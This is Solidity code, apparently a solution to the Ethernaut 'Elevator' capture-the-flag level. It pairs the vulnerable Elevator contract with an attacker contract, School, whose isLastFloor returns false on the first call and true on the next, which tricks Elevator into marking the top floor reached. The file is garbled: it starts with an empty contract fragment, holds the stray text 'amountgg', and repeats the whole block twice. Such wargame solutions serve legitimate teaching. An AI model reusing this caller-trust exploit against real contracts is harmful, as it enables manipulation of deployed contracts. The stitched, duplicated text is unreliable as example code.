contract Elevator {

}// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract School is Building {

  uint public floors = 15;
  address elevatorAddr = 0xe1feEB71595Fe59e8B1Cb396871bD1b7E9B511e6;
  Elevator elevator = Elevator(elevatorAddr);
  uint public i = 0;

  function isLastFloor(uint _floor) override external returns (bool){
    if (i == 0){
      i++;
      return false;
    } else {
      return true;
    }
  }

  function goTo(uint _floor) external{
    elevator.goTo(_floor);
  } 
}amountgg// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract School is Building {

  uint public floors = 15;
  address elevatorAddr = 0xe1feEB71595Fe59e8B1Cb396871bD1b7E9B511e6;
  Elevator elevator = Elevator(elevatorAddr);
  uint public i = 0;

  function isLastFloor(uint _floor) override external returns (bool){
    if (i == 0){
      i++;
      return false;
    } else {
      return true;
    }
  }

  function goTo(uint _floor) external{
    elevator.goTo(_floor);
  } 
}